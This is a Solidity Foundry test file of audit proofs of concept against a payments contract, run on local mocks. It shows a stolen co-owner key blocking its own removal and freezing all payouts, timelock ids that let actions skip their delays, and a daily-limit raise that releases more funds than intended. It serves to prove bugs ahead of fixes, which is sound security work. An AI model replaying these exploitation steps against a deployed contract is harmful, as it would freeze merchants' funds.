// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/*  RE-AUDIT 2026-11-07: proofs of concept against the review branch
    (ccr-0eaeb356-459a6u at 73fa334, PossessioPayments v3.0.3).

    EVIDENCE, NOT FOR MERGING. Every test here PASSES on the review branch, and
    passing means the bug is there. Each fix PR turns the matching test red, which
    is the planted-break proof read the other way; close this PR once the fixes land.

    RESULTS STATEMENT (Constitution, Amendment VIII)
      Proof Scope:
        R-1  a co-owner that the other owners queue for removal cancels its own
             removal, every time, so it can never be removed; while it stays it
             removes every payee and cancels every new payee before it is
             active, so no exit (sendUSDC, sendCbETH, redeemMorpho, emergency)
             can reach anyone: the funds are frozen for as long as it likes.
        R-2  timelock ids are not bound to their action: resumeAuctions accepts
             any matured id (an owner-grant id un-pauses at once), consuming
             that id strands the grant it belonged to, and executeForwarderUpdate
             accepts any matured id, so a forwarder change skips its 48 h.
        R-3  an executed daily-limit increase drains the time since the last
             spend at the new rate, freeing up to (new - old) x elapsed / 24 h
             more than the bucket earned (30k out in 12 h where 25k is allowed).
      Boundary Conditions: two owners (the factory-written owner and one co-owner
        added through the v3.0.3 queue); single owner for R-2 and R-3.
      Assumption Log: the shared v3 mocks (PaymentsV3Mocks.sol): MockUSDC_V3,
        MockCbETH_V3, MockFeed_V3, MockLST_V3, MockVault_V3. No network, no fork.
      Non-Proven Scope: (DERIVED, not run) a stolen SOLE owner key reaches the
        same freeze by the same moves, and can also cut a daily limit at once and
        cancel every raise; R-1 is the co-owner case, where the merchant's own
        remedy, the revoke queue, cannot remove an owner that objects. No funds
        move to the thief in any of these tests: the harm is a freeze (ransom
        leverage), which is why R-1 is Medium, not High.
        What a real merchant's console shows; whether a merchant
        would run two owner addresses (the contract allows it and v3.0.3's own
        comment invites a handover through a second owner).
      Execution Context: forge 1.5.1, solc 0.8.26/0.8.35, offline, local.
      Drift caught: the first R-3 test held block.timestamp in a local across a
        warp; under via-ir it is re-read, so the raise ran 24 h after the spend
        and the test passed with or without the bug. Now vm.getBlockTimestamp();
        with the R-3 fix the test fails at 15k != 20k (MEASURED).
*/

import {PaymentsV3Base} from "../v3/Base.sol";
import {PossessioPayments} from "../../src/PossessioPayments.sol";

contract PoC_ReAudit20261107 is PaymentsV3Base {
    address CO_OWNER = makeAddr("co-owner");     // the merchant's second key, later stolen

    function _role() internal view returns (bytes32) { return pay.OWNER_ROLE(); }
    function _delay() internal view returns (uint256) { return pay.TIMELOCK() + 1; }

    /// The merchant adds a second owner the documented way (queue, wait, execute).
    function _addCoOwner() internal {
        vm.prank(OWNER);
        bytes32 id = pay.queueOwnerGrant(CO_OWNER);
        vm.warp(block.timestamp + _delay());
        vm.prank(OWNER);
        pay.executeOwnerGrant(CO_OWNER, id);
        assertEq(pay.ownerCount(), 2);
    }

    // ─────────────────────────────────────────────────────────────────────
    // R-1 (Medium): a stolen co-owner key can never be removed, and freezes every exit
    // ─────────────────────────────────────────────────────────────────────

    /// The merchant queues the stolen co-owner's removal three times; each time
    /// the co-owner cancels it. After a week it is still an owner.
    function test_POC_R1_coOwnerCancelsItsOwnRemovalForever() public {
        _addCoOwner();
        for (uint256 i = 0; i < 3; i++) {
            vm.prank(OWNER);
            bytes32 id = pay.queueOwnerRevoke(CO_OWNER);
            vm.prank(CO_OWNER);
            pay.cancelOwnerRevoke(CO_OWNER);          // the target cancels its own removal
            vm.warp(block.timestamp + _delay());
            vm.prank(OWNER);
            vm.expectRevert(PossessioPayments.NotQueued.selector);
            pay.executeOwnerRevoke(CO_OWNER, id);
        }
        assertTrue(pay.hasRole(_role(), CO_OWNER), "stolen co-owner is still an owner");
        assertEq(pay.ownerCount(), 2);
    }

    /// While it stays, the stolen co-owner freezes every exit: it removes the
    /// payees, cancels each new payee before it is active, and cancels the
    /// emergency path. The merchant's funds reach no one.
    function test_POC_R1_coOwnerFreezesEveryExit() public {
        _addCoOwner();
        _fund(5_000e6);
        cbeth.mint(address(pay), 1 ether);

        // The stolen key removes the merchant's only payee, at once.
        vm.prank(CO_OWNER);
        pay.removePayee(PAYEE);

        // The merchant proposes a fresh payee; the stolen key cancels it before
        // the 48 h pass. Repeated, it never becomes active.
        address fresh = makeAddr("fresh-payee");
        for (uint256 i = 0; i < 3; i++) {
            vm.prank(OWNER);
            pay.proposePayee(fresh);
            vm.warp(block.timestamp + 1 days);
            vm.prank(CO_OWNER);
            pay.removePayee(fresh);
            vm.warp(block.timestamp + 1 days + 1);
        }

        // The emergency path: the merchant queues, the stolen key cancels.
        vm.prank(OWNER);
        pay.queueEmergencyWithdraw(address(usdc), 5_000e6);
        vm.prank(CO_OWNER);
        pay.cancelEmergencyWithdraw(address(usdc));
        vm.warp(block.timestamp + pay.EMERGENCY_DELAY() + 1);

        // Every exit refuses every destination the merchant controls.
        vm.startPrank(OWNER);
        vm.expectRevert(abi.encodeWithSelector(PossessioPayments.NotAPayee.selector, PAYEE));
        pay.sendUSDC(100e6, PAYEE);
        vm.expectRevert(abi.encodeWithSelector(PossessioPayments.NotAPayee.selector, fresh));
        pay.sendUSDC(100e6, fresh);
        vm.expectRevert(abi.encodeWithSelector(PossessioPayments.NotAPayee.selector, fresh));
        pay.sendCbETH(0.1 ether, fresh);
        vm.expectRevert(abi.encodeWithSelector(PossessioPayments.NotAPayee.selector, fresh));
        pay.executeEmergencyWithdraw(address(usdc), fresh);
        vm.stopPrank();

        assertEq(usdc.balanceOf(address(pay)), 5_000e6, "all USDC still frozen in the contract");
        assertEq(cbeth.balanceOf(address(pay)), 1 ether, "all cbETH still frozen in the contract");
        assertFalse(pay.isPayee(PAYEE));
        assertFalse(pay.isPayee(fresh));
    }

    // ─────────────────────────────────────────────────────────────────────
    // R-2 (Low): timelock ids are not bound to their action
    // ─────────────────────────────────────────────────────────────────────

    /// The merchant pauses auctions. A matured id from an unrelated queue (here
    /// an owner grant) resumes them at once, with no resume ever queued.
    function test_POC_R2_resumeAuctions_acceptsAnOwnerGrantId() public {
        vm.prank(OWNER);
        bytes32 grantId = pay.queueOwnerGrant(CO_OWNER);
        vm.warp(block.timestamp + _delay());

        vm.prank(OWNER);
        pay.pauseAuctions();
        assertTrue(pay.auctionsPaused());

        vm.prank(OWNER);
        pay.resumeAuctions(grantId);                  // no queueResumeAuctions anywhere
        assertFalse(pay.auctionsPaused(), "resumed with an owner-grant id, no 48 h resume queue");

        // And the grant that id belonged to is now stranded: it can neither be
        // executed nor queued again until someone notices and cancels it.
        vm.prank(OWNER);
        vm.expectRevert(PossessioPayments.NotQueued.selector);
        pay.executeOwnerGrant(CO_OWNER, grantId);
        vm.prank(OWNER);
        vm.expectRevert(PossessioPayments.AlreadyQueued.selector);
        pay.queueOwnerGrant(CO_OWNER);
    }

    /// A forwarder update is meant to wait 48 h. Any matured id executes it at once.
    function test_POC_R2_forwarderUpdate_skipsItsTimelock() public {
        address first = makeAddr("forwarder-1");
        address evil  = makeAddr("forwarder-2");
        vm.startPrank(OWNER);
        pay.setForwarder(first);
        bytes32 oldId = pay.queueResumeAuctions();    // any queue; never used
        vm.stopPrank();
        vm.warp(block.timestamp + _delay());

        vm.startPrank(OWNER);
        pay.queueForwarderUpdate(evil);               // queued this block
        pay.executeForwarderUpdate(oldId);            // executed this block, with another id
        vm.stopPrank();
        assertEq(pay.automationForwarder(), evil, "forwarder changed with no 48 h wait");
    }

    // ─────────────────────────────────────────────────────────────────────
    // R-3 (Low): an executed limit increase refills the past at the new rate
    // ─────────────────────────────────────────────────────────────────────

    /// Limit 10k. The owner spends the full 10k, 12 h later executes a queued
    /// raise to 20k. The bucket drained at 10k/day for those 12 h, so 5k of the
    /// spend is still in it and 15k should be free. The contract drains the
    /// past 12 h at the new 20k/day rate and frees the full 20k: 5k more than
    /// the bucket ever earned, and 30k out in 12 h where the design allows 25k.
    function test_POC_R3_limitIncrease_refillsThePastAtTheNewRate() public {
        _fund(40_000e6);
        uint256 t0 = vm.getBlockTimestamp();   // not block.timestamp: via-ir re-reads it after a warp
        vm.prank(OWNER);
        pay.queueAssetDailyLimitIncrease(PossessioPayments.DailyLimitAsset.USDC, 2 * USDC_LIMIT);

        vm.warp(t0 + 12 hours);
        vm.prank(OWNER);
        pay.sendUSDC(USDC_LIMIT, PAYEE);                       // the full 10k
        assertEq(pay.usdcDailyRemaining(), 0);

        vm.warp(t0 + 24 hours);                                // 12 h later, the raise matures
        vm.prank(OWNER);
        pay.executeAssetDailyLimitIncrease(PossessioPayments.DailyLimitAsset.USDC);

        uint256 settledAtOldRate = USDC_LIMIT - USDC_LIMIT / 2;            // 5k still spent
        uint256 designed = 2 * USDC_LIMIT - settledAtOldRate;              // 15k free
        assertEq(pay.usdcDailyRemaining(), 2 * USDC_LIMIT, "the full 20k is free at once");
        assertGt(pay.usdcDailyRemaining(), designed);

        vm.prank(OWNER);
        pay.sendUSDC(2 * USDC_LIMIT, PAYEE);                   // and it goes out
        assertEq(usdc.balanceOf(PAYEE), 3 * USDC_LIMIT, "30k out in 12 h; the bucket allows 25k");
    }
}
